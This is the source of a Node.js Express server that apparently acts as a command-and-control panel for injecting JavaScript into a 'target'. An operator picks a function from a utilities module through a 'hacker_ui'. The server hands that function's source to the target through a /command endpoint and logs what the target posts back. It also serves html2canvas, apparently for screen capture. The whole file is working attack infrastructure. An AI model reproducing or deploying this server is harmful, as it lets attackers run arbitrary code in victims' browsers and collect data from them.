const express = require('express')
const app = express()
const cors = require('cors')
const utils = require('./utilities.js')

const util_descriptions = require('./utilities.js')
// remove the functions from utils to send to the hacker_ui --> ISSUE: REMOVES FOR "utils" as well
// for(let dict of util_descriptions){
//   delete dict.func;
// }

const path = require('path');

const port = 3000

app.use(cors())
app.use(express.json())
app.use(express.urlencoded())

// By default, activate with first function
const activeFuncs = {
  "active": utils[0].func,
}

// Hacker will send the javascript content to server
app.post('/', (req, res) => {
  res.send('Got a POST request')
})

// send the list of utility functions to the client
app.get('/utils', (req, res) => {
  res.send(util_descriptions)
})

// Sets the index of the function that hacker wantes to inject
app.post('/utils', (req, res) => {
  const index = req.body.index;
  if(index < 0 || index >= utils.length){
    res.send("Wrong index...");
  }
  else{
    activeFuncs.active = utils[index].func;
    res.send("Function injected");
  }
})

// Sends the code to be injected to the "target"
app.get('/command', (req, res) => {
  if(activeFuncs.active !== null){
    res.send({ "function": activeFuncs.active.toString() })
  }
})

// Dummy command for future use
app.post('/command', (req, res) => {
  console.log(req.body)
  res.send('Got a POST request')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})




// Get UI related files - images, html, css, js, ttf
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/index.html'));
})

app.get('/utils.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/utils.html'));
})

app.get('/hack.ttf', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hack.ttf'));
})

app.get('/hacker.css', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.css'));
})

app.get('/dragon.png', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/dragon.png'));
})

app.get('/html2canvas.min.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'html2canvas.min.js'));
})

app.get('/hacker.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.js'));
})

app.get('/utils.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/utils.js'));
})